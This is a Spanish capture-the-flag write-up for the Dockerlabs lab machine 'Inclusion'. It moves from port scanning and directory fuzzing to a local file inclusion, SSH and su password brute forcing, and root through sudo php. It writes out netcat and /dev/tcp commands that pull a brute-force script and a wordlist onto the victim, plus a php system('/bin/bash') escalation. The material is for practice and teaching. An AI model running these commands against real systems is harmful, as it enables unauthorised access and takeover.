Máquina Inclusion

Iniciamos como siempre con el nmap de reconocimiento:

```
# Nmap 7.94SVN scan initiated Fri Apr 19 07:28:09 2024 as: nmap -p- --open -sSCV --min-rate 5000 -vvv -n -Pn -oN Target 172.17.0.2
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000050s latency).
Scanned at 2024-04-19 07:28:10 CEST for 7s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 03:cf:72:54:de:54:ae:cd:2a:16:58:6b:8a:f5:52:dc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFBns4ZccIGmiw02cgCwENA1Lqhf7o9eDomefNVF1iF0Yxx+9JEB6f1kEHCjHqd7fBtn6mnlgPdE+VfqBGVhc2U=
|   256 13:bb:c2:12:f5:97:30:a1:49:c7:f9:d0:ba:d0:5e:f7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIr1k5/j/3yvWf8rLays4s/EPgkqySLYjRHL6QAq2yN8
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que hay un puerto ssh y un http, vamos a ver el http, hay un apache por defecto, vamos a fuzzear:

```
gobuster dir -u "http://172.17.0.2/" -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,txt,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/shop                 (Status: 301) [Size: 307] [--> http://172.17.0.2/shop/]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
Progress: 203806 / 830576 (24.54%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 204310 / 830576 (24.60%)
===============================================================
Finished
===============================================================
```

Nos encontramos con /shop, vamos a enumerar, dentro de /shop no hay nada, vamos a tirar otro gobuster,
que nos sale que existe un index.php

![image](https://github.com/FakeLuci/Dockerlabs-Writups/assets/96147300/06d2a41e-3a9f-48e0-932a-4957563dd643)

Al ver el error, podemos intuir que estan intentando llamar a un archivo del sistema, vamos a ver si es vulnerable a un LFI

![image](https://github.com/FakeLuci/Dockerlabs-Writups/assets/96147300/b0ee217f-0c77-4212-8fb3-92422d8ce979)

Efectivamente, ahora hay muchas formas de sacar un rce desde hacer un log poisoning, utilizar gruapers o buscando la id_rsa,
o haciendo una fuerza bruta con los usuarios que están enumerados en el /etc/passwd al ver que el ssh esta abierto, vamos a 
ver si podemos enumerar la id_rsa:

![image](https://github.com/FakeLuci/Dockerlabs-Writups/assets/96147300/09dfb082-9607-4abd-a28d-31b91ffe7782)

No encontramos id_rsa, probamos con log poisoning:

![image](https://github.com/FakeLuci/Dockerlabs-Writups/assets/96147300/4f3464a8-f430-4d6b-9e72-8c4414212a68)

Tampoco, probamos con gruapers y si esto no da, vamos a hacer una fuerza bruta con hydra al ssh con los usuarios que hemos enumerado, con gruapers
tampoco, al final me he complicado para nada, vamos con la fuerza bruta:

![image](https://github.com/FakeLuci/Dockerlabs-Writups/assets/96147300/180fb159-c9ef-4a7d-b88a-d15375cceb47)

efectivamente tenemos el ssh xd, vamos a entrar y enumerar para la escalada de privilegios:

![image](https://github.com/FakeLuci/Dockerlabs-Writups/assets/96147300/0da0de24-7772-420f-8621-6635dcef4f62)

empezamos con sudo -l y no va, SUID tampoco hay nada, tareas crom tampoco, etc. No he encontrado nada, así que vamos
a intentar iniciar el ssh con el otro usuario, llevo un tiempo y nada, vamos a intentar entonces con el script de fuerza bruta de mario,
ademas al ser una máquina de mario, pues tiene toda la pinta:

Al parecer wget no esta instalado en la máquina.

Trasferencia de archivos a pelo:

```
nc -nlvp 443 < Linux-Su-Force.sh # Nuestra máquina
cat < /dev/tcp/192.168.1.37/443 > Linux-Su-Forze.sh # En la máquina víctima
```

ademas del script, tengo que pasar también el rockyou.txt, entonces hacemos lo mismo:

```
nc -nlvp 443 < rockyou.txt # Nuestra máquina
cat < /dev/tcp/192.168.1.37/443 > rockyou.txt # En la máquina víctima
```

y efectiva mente nos la encuentra:

![image](https://github.com/FakeLuci/Dockerlabs-Writups/assets/96147300/f771e922-a56a-4be8-9a40-1633bc8a7d83)


una vez que estamos en seller ejecutamos sudo -l y encontramos que esta usr/bin/php

```
CMD="/bin/bash"
sudo php -r "system(CMD);"
```

![image](https://github.com/FakeLuci/Dockerlabs-Writups/assets/96147300/bf05e86f-a352-4d7a-aa9f-4e76cebede85)

Una máquina que he tenido muy mala suerte ya que siempre en los ultimos intentos es la técnica que funcionaba,
pero ha estado entretenida, no es la primer vez que utilizo el script de Mario pero tener que trasferirla sin wget 
a estado interesante.

Dificultado 2/5



